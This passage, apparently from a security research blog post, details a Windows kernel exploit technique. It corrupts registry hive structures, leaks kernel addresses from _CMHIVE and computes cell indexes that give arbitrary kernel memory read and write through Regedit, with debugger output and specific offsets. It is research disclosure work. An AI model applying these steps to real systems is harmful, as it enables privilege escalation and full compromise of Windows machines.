is expanded or shrunk), all future checks performed in HvpReleaseCellPaged against this hive will no longer pose any risk &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;to the exploit stability.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;
 &lt;p class=&quot;ormwWEjHLs-c34 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c34&quot;&gt;&lt;span&gt;To better realize just how close the overwriting of the Length field is to its use in the bounds check, we can have a look at the disassembly of the CmpSetValueKeyExisting function, where this whole logic takes place.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgbtZHk2IHFvAbb59ztN7-JJq_tGyZsFjGIRG5EhNbJNcClAck69T03MOoCOjj-YMooGtKFR05vz8a_UWIiOCufx8pZXWAMga3rRLyJagMHmk_yE5cC3u-oK0dBysZprbkN9TrnUunHwwyevoPH1lnuEEwox6m6RrbA2_vvfKd42NqrrcU6itScoGywM5g/s1999/image20.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgbtZHk2IHFvAbb59ztN7-JJq_tGyZsFjGIRG5EhNbJNcClAck69T03MOoCOjj-YMooGtKFR05vz8a_UWIiOCufx8pZXWAMga3rRLyJagMHmk_yE5cC3u-oK0dBysZprbkN9TrnUunHwwyevoPH1lnuEEwox6m6RrbA2_vvfKd42NqrrcU6itScoGywM5g/s1200/image20.png&quot; border=&quot;0&quot; alt=&quot;Dissasembly output&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Dissasembly output&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;The technique works by a hair&amp;#39;s breadth &amp;ndash; the memmove and HvpReleaseCellPaged calls are separated by only a few instructions. Nevertheless, it works, and if we first perform a write to the 0xB260338C index (or equivalent) after gaining binary control over the hive, then we will be subsequently able to read from/write to any OOB indexes without any restrictions in the future.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;For completeness, I should mention that after corrupting the Length field, it is worthwhile to set a few additional flags in the _HHIVE.HiveFlags field using the same trick as before.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This prevents the kernel from crashing due to the unexpectedly large hive length.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Specifically, the flags are (as named in &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2025/04/the-windows-registry-adventure-6-kernel.html&quot;&gt;blog post&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2025/04/the-windows-registry-adventure-6-kernel.html&quot;&gt;&amp;nbsp;#&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2025/04/the-windows-registry-adventure-6-kernel.html&quot;&gt;6&lt;/a&gt;&lt;/span&gt;&lt;span&gt;):&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_hyrlma59f00u-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c26 c16 li-bullet-0&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c17&quot;&gt;HIVE_COMPLETE_UNLOAD_STARTED&lt;/span&gt;&lt;span&gt;&amp;nbsp;(0x40): This prevents a crash during potential hive unloading in the CmpLateUnloadHiveWorker &amp;rarr; CmpCompleteUnloadKey &amp;rarr; HvHiveCleanup &amp;rarr; HvpFreeMap &amp;rarr; CmpFree function.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c26 c16 li-bullet-0&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c17&quot;&gt;HIVE_FILE_READ_ONLY&lt;/span&gt;&lt;span&gt;&amp;nbsp;(0x8000): This prevents a crash that could occur in the CmpFlushHive &amp;rarr; HvStoreModifiedData &amp;rarr; HvpTruncateBins path.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;Of course, these are just conclusions drawn from writing a demonstration exploit, so I don&amp;#39;t guarantee that the above flags are sufficient to maintain system stability in every configuration.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Nevertheless, repeated tests have shown that it works in my environment, and if we subsequently set the data cell index of the controlled value back to 0xB2603000, and the Type/DataLength fields to something like REG_BINARY and 0x100, we should be finally able to see the following result in the Registry Editor:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c8&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKF44SfhRjLnZrSVof5G2zdwHiS69BncbcaBPI_uWMf5aCpd4xKLMGmDba_dgE0hZvYothSx42-DUw26LZ5sZEV4X3B_oZ33PZib7xXH-u1wM4Pk0HcZAFRUPoDX3NPavFg2waCpcso2-vLVtPq_cn_gPmiecuTAGGu0q3nYjKcs5NArFRMggfV5gX9Ec/s602/image13.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKF44SfhRjLnZrSVof5G2zdwHiS69BncbcaBPI_uWMf5aCpd4xKLMGmDba_dgE0hZvYothSx42-DUw26LZ5sZEV4X3B_oZ33PZib7xXH-u1wM4Pk0HcZAFRUPoDX3NPavFg2waCpcso2-vLVtPq_cn_gPmiecuTAGGu0q3nYjKcs5NArFRMggfV5gX9Ec/s602/image13.png&quot; border=&quot;0&quot; alt=&quot;Result in registry editor&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Result in registry editor&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;It is easy to verify that this is indeed a &amp;quot;live view&amp;quot; into the _CMHIVE structure in kernel memory:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;ormwWEjHLs-c19&quot;&gt;&lt;tr class=&quot;ormwWEjHLs-c12&quot;&gt;&lt;td class=&quot;ormwWEjHLs-c11&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0: kd&amp;gt; dt _HHIVE ffff810713f82000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;nt!_HHIVE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;nbsp; &amp;nbsp;+0x000 Signature &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;: 0xbee0bee0&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;nbsp; &amp;nbsp;+0x008 GetCellRoutine &amp;nbsp; : 0xfffff801`8049b370 &amp;nbsp; &amp;nbsp; _CELL_DATA* &amp;nbsp;nt!HvpGetCellPaged+0&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;nbsp; &amp;nbsp;+0x010 ReleaseCellRoutine : 0xfffff801`8049b330 &amp;nbsp; &amp;nbsp; void &amp;nbsp;nt!HvpReleaseCellPaged+0&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;nbsp; &amp;nbsp;+0x018 Allocate &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : 0xfffff801`804cae30 &amp;nbsp; &amp;nbsp; void* &amp;nbsp;nt!CmpAllocate+0&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;nbsp; &amp;nbsp;+0x020 Free &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : 0xfffff801`804c9100 &amp;nbsp; &amp;nbsp; void &amp;nbsp;nt!CmpFree+0&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;nbsp; &amp;nbsp;+0x028 FileWrite &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;: 0xfffff801`80595e00 &amp;nbsp; &amp;nbsp; long &amp;nbsp;nt!CmpFileWrite+0&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;nbsp; &amp;nbsp;+0x030 FileRead &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : 0xfffff801`805336a0 &amp;nbsp; &amp;nbsp; long &amp;nbsp;nt!CmpFileRead+0&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;nbsp; &amp;nbsp;+0x038 HiveLoadFailure &amp;nbsp;: (null) &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;nbsp; &amp;nbsp;+0x040 BaseBlock &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;: 0xffff8107`13f9a000 _HBASE_BLOCK&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;[...]&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;Unfortunately, the hive signature 0xBEE0BEE0 is not visible in the screenshot, because the first four bytes of the cell are treated as its size, and only the subsequent bytes as actual data. For this reason, the entire view of the structure is shifted by 4 bytes.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Nevertheless, it is immediately apparent that we have gained direct access to function addresses within the kernel image, as well as many other interesting pointers and data.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;We are getting very close to our goal!&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;ormwWEjHLs-c24&quot; id=&quot;h.12ahebyie4mx&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c35 ormwWEjHLs-c14&quot;&gt;Step 3: Getting arbitrary read/write access to the entire kernel address space&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;At this point, we can both read from and write to the _CMHIVE structure through our magic value, and also operate on any other out-of-bounds cell index that resolves to a valid address. This means that we no longer need to worry about kernel ASLR, as _CMHIVE readily leaks the base address of ntoskrnl.exe, as well as many other addresses from kernel pools. The question now is how, with these capabilities, to execute our own payload in kernel-mode or otherwise elevate our process&amp;#39;s privileges in the system. What may immediately come to mind based on the layout of the _CMHIVE / _HHIVE structure is the idea of overwriting one of the function pointers located at the beginning. In practice, this is less useful than it seems. As I wrote in &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2025/04/the-windows-registry-adventure-6-kernel.html&quot;&gt;blog post #6&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;, the vast majority of operations on these pointers have been devirtualized, and in the few cases where they are still used directly, the Control Flow Guard mitigation is enabled. Perhaps something could be ultimately worked out to bypass CFG, but with the primitives currently available to us, I decided that this sounds more difficult than it should be.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;If not that, then what else?&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Experienced exploit developers would surely find dozens of different ways to complete the privilege escalation process.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, I had a specific goal in mind that I wanted to achieve from the start.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;I thought it would be elegant to create an arrangement of objects where the final stage of exploitation could be performed interactively from within Regedit.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This brings us back to the selection of our two fake values, &amp;quot;KernelAddr&amp;quot; and &amp;quot;KernelData&amp;quot;. My goal with these values was to be able to enter any kernel address into KernelAddr, and have KernelData automatically&amp;mdash;based solely on how the registry works&amp;mdash;contain the data from that address, available for both reading and writing.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This would enable a very unique situation where the user could view and modify kernel memory within the graphical interface of a tool available in a default Windows installation&amp;mdash;something that doesn&amp;#39;t happen very often.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;&amp;#128578;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;The crucial observation that allows us to even consider such a setup is the versatility of the cell maps mechanism.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In order for such an obscure arrangement to work, KernelData must utilize a _HMAP_ENTRY structure controlled by KernelAddr at the final stage of the cell walk.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Referring back to the previous diagram illustrating the relationships between the _CMHIVE structure and other objects, this implies that if KernelAddr reaches an object through two pointer dereferences, KernelData must be configured to reach it with a single dereference&lt;/span&gt;&lt;span&gt;, so that the&lt;/span&gt;&lt;span&gt;&amp;nbsp;second dereference then occurs through the data stored in KernelAddr.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;In practice, t&lt;/span&gt;&lt;span&gt;his can be achieved as follows: KernelAddr will function similarly as before, pointing to an offset within _CMHIVE using a series of pointer dereferences:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_ndr66mjka4k5-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c9 c16 li-bullet-0&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c17&quot;&gt;_CMHIVE.CmRm &amp;rarr; _CM_RM.Hive &amp;rarr; _CMHIVE&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;: for normal hives (e.g., HKCU).&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c9 c16 li-bullet-0&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c17&quot;&gt;_CMHIVE.RootKcb &amp;rarr; _CM_KEY_CONTROL_BLOCK.KeyHive &amp;rarr; _CMHIVE&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;: for app hives.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;For KernelData, we can use any self-referencing pointer &lt;/span&gt;&lt;span&gt;in the first step of the cell walk&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;These are plentiful in _CMHIVE, due to the fact that there are many &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-list_entry&quot;&gt;LIST_ENTRY&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;objects initialized as an empty list.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;The next step is to select the appropriate offsets and indexes based on the layout of the _CMHIVE structure, so that everything aligns with our plan.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Starting with KernelAddr, the highest 20 bits of the cell index remain the same as before, which is 0xB2603&lt;/span&gt;&lt;span&gt;???&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The lower 12 bits will correspond to an offset within _CMHIVE where we will place our fake _HMAP_ENTRY object.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This should be a 0x18 byte area that is generally unused and located after a self-referencing pointer.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;For demonstration purposes, I used offset 0xB70, which corresponds to the following fields:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;ormwWEjHLs-c20&quot;&gt;&lt;tr class=&quot;ormwWEjHLs-c12&quot;&gt;&lt;td class=&quot;ormwWEjHLs-c22 ormwWEjHLs-c32&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c29&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c17 ormwWEjHLs-c45&quot;&gt;_CMHIVE layout&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ormwWEjHLs-c30&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c29&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c45 ormwWEjHLs-c17&quot;&gt;_HMAP_ENTRY layout&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;ormwWEjHLs-c12&quot;&gt;&lt;td class=&quot;ormwWEjHLs-c22&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c29&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c15&quot;&gt;+0xb70 UnloadEventArray : Ptr64 Ptr64 _KEVENT&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ormwWEjHLs-c33&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c29&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c15&quot;&gt;+0x000 BlockOffset &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : Uint8B&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;ormwWEjHLs-c12&quot;&gt;&lt;td class=&quot;ormwWEjHLs-c22&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c29&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c15&quot;&gt;+0xb78 RootKcb &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;: Ptr64 _CM_KEY_CONTROL_BLOCK&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ormwWEjHLs-c33&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c29&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c15&quot;&gt;+0x008 PermanentBinAddress : Uint8B&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;ormwWEjHLs-c12&quot;&gt;&lt;td class=&quot;ormwWEjHLs-c22&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c29&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c15&quot;&gt;+0xb80 Frozen &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : UChar&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ormwWEjHLs-c33&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c29&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c15&quot;&gt;+0x010 MemAlloc &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;: Uint4B&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;On my test Windows 11 system, all these fields are zeroed out and unused for the HKCU hive, which makes them well-suited for acting as the _HMAP_ENTRY structure.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The final cell index for the KernelAddr value will, therefore, be &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c17&quot;&gt;0xB2603000 + 0xB70 - 0x4 = 0xB2603B6C&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;If we set its type to REG_QWORD and its length to 8 bytes, then each write to it will result in setting the _CMHIVE.UnloadEventArray field (or _HMAP_ENTRY.BlockOffset in the context of the cell walk) to the specified 64-bit number.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;As for KernelData, we will use _CMHIVE.SecurityHash[3].Flink, located at offset 0x798, as the aforementioned self-referencing pointer.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;To calculate the directory index value, we need to subtract it from the offset of _CMHIVE.Hive.Storage[1].SmallDir and then divide by 8, which gives us: (0x798 - 0x3A0) &amp;divide; 8 = 0x7F.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Next, we will calculate the table index by subtracting the offset of the fake _HMAP_ENTRY structure from the offset of the self-referencing pointer and then dividing the result by the size of _HMAP_ENTRY: (0xB70 - 0x798) &amp;divide; 0x18 = 0x29.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;If we assume that the 12-bit offset part is zero (we don&amp;#39;t want to add any offsets at this point), then we have all the elements needed to compose the full cell index.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;We will use the MakeCellIndex helper function defined earlier for this purpose&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;ormwWEjHLs-c19&quot;&gt;&lt;tr class=&quot;ormwWEjHLs-c12&quot;&gt;&lt;td class=&quot;ormwWEjHLs-c11&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;MakeCellIndex(1,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0x7F,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0x29,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0x8fe29000&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
